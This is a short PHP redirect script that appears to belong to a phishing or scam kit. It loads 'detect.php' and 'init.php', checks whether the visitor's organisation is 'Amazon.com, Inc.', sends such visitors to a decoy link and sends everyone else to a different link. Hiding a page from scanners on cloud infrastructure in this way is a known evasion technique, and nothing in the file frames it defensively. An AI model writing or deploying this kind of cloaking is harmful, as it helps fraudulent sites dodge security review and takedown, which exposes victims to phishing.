<?php

include ('detect.php');
include ('init.php');


if ($org == "Amazon.com, Inc.") {
    header("location: $redLink");
    exit();
}
else {
    header("location: $myLink");
    exit();
}
